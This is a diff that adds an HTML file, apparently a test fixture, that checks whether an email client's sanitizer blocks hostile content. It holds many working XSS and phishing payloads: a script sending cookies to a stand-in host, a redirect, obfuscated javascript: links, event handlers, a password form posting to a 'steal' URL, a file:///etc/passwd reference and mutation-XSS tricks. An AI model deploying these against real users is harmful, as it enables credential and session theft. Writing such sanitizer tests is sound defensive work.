@@ -1,0 +1,22 @@
+<html>
+<head>
+<meta http-equiv="refresh" content="0; url=https://phish.example.net/">
+<base href="https://phish.example.net/">
+<script>document.location='https://phish.example.net/?c='+document.cookie</script>
+</head>
+<body onload="alert('body')">
+<h3 style="font-family:Arial,sans-serif;">Hostile email — should look harmless</h3>
+<p>Image with onerror: <img src="cid:none" onerror="alert(1)" alt="x"></p>
+<p><a href="javascript:alert(document.domain)">javascript link</a> · <a href="JaVaScRiPt&#58;alert(1)">obfuscated</a> · <a href="&#x6A;avascript:alert(1)">entity</a> · <a href="vbscript:msgbox(1)">vbscript</a> · <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data html</a></p>
+<iframe src="https://phish.example.net/login" width="400" height="200">iframe fallback text (removed)</iframe>
+<object data="https://phish.example.net/x.swf"><embed src="https://phish.example.net/x.swf"></object>
+<form action="https://phish.example.net/steal" method="post" style="border:1px solid #c00;padding:8px;width:300px;">
+  <label>Password: <input type="password" name="p"></label> <button type="submit" formaction="https://phish.example.net/alt">Log in</button>
+</form>
+<svg width="120" height="40" onload="alert('svg')"><script>alert('svg-script')</script><a xlink:href="javascript:alert(2)"><rect width="120" height="40" fill="#fc6"/></a><image href="file:///etc/passwd" width="10" height="10"/></svg>
+<div style="width:expression(alert(3));background:url(javascript:alert(4))">CSS expression</div>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(5)></style></mglyph></table></mtext></math>
+<noscript><p title="</noscript><img src=x onerror=alert(6)>">noscript mXSS</p></noscript>
+<p style="font-family:Arial,sans-serif;">If you can read this and nothing executed or loaded, the sanitizer and net provider work.</p>
+</body>
+</html>
